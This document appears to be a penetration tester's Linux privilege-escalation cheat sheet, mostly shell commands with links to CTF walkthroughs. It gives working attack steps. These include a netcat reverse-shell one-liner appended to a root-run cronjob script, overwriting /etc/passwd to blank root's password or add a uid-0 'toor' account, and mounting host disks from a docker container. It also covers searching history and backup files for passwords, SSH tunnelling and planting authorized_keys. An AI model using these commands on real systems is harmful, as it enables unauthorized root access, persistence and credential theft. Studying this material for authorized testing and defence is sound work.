# Linux Privilege Escalation

## Insecure File Permissions

### Cronjob file

Cronjob file check.sh overwrite

``` bash
grep "CRON" /var/log/* 2>/dev/null
```

File check.sh running as root every 1 minute.

``` bash
ls -l check.sh
```

Can change file check.sh with user permission.

``` bash
echo "rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f" >> check.sh
```

### File /etc/passwd

File /etc/passwd can be modify by user permission.

``` bash
ls -l /etc/passwd
-rw-rw-rw- 1 root root <snip> /etc/passwd
```

`U6aMy0wojraho` : non password.

``` bash
sed 's/root:x:/root:U6aMy0wojraho:/' /etc/passwd > passwd
cat passwd > /etc/passwd
su
```

Generate password for new user

``` bash
openssl passwd -1 -salt hades leecybersec
```

``` bash
echo toor:$1$hades$KKCtexC.plAyjcJkX7War0:0:0:root:/root:/bin/bash >> /etc/passwd
```

[https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation](https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation)

## Check sudo access 

``` bash
$ sudo -l
[sudo] password for Hades: 
Matching Defaults entries for pentesterlab on 7358cafc3ebe:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/bash
```

Mix cp/chown and chmod

https://www.adampalmer.me/iodigitalsec/2009/10/03/linux-c-setuid-setgid-tutorial/

https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/

``` bash
sudo -l
Matching Defaults entries for Hades:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User Hades may run the following commands:
    (victim) /bin/chmod, /bin/cp
```

## Checking docker container

``` bash
root@315d7648a173:/# ls -lah
<snip>
-rwxr-xr-x   1 root root    0 Jun  9 13:01 .dockerenv
```

``` bash
mkdir -p /mnt/hola
```

``` bash
mount /dev/sda1 /mnt/hola
mount /dev/sda2 /mnt/hola
mount /dev/sda3 /mnt/hola
```

## Kernel Exploit

### OS Version & Architecture

``` bash
cat /etc/issue; uname -r; arch
```

### Compile exploit in C/C++

=== "Compile file"

	``` bash
	$ gcc -m32 Size.c -o x86-S
	```

	``` bash
	$ ./x86-S
	Size = 4 
	```

	``` bash
	$ gcc Size.c -o x64-S
	```

	``` bash
	$ ./x64-S
	Size = 8
	```

=== "File Size.c"

	``` c
	#include<stdio.h>
	int main()
	{
	        printf("Size = %lu", sizeof(size_t));
	}
	```

### For Example

[Full-Nelson.c Exploit Kernel](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/004-popcorn_torrent-hoster_pam-1.1.0-kernel-2.6.37#full-nelsonc-exploit-kernel)

## More Reference

### history, bashrc, backup

``` bash
find / -name *history* 2>/dev/null
find / -name *backup* 2>/dev/null
find / -name *bashrc* -exec grep passwod {} \; 2>/dev/null
```

### <a href='https://www.ssh.com/ssh/tunneling/example' target="blank">Port Tunneling</a>

Local Tunneling

``` bash
ssh -L $myport:127.0.0.1:5985 hades@192.168.11.133 -i id_rsa
```

Remote Tunneling

``` bash
ssh -R $myip:$myport:127.0.0.1:5985 kali@$myip -i kali-idrsa
```

SSH ESCAPE CHARACTERS

`~C` to type ssh command

### Generate SSH Key

``` bash
ssh-keygen -t rsa
```

``` bash
cp id_rsa.pub authorized_keys
```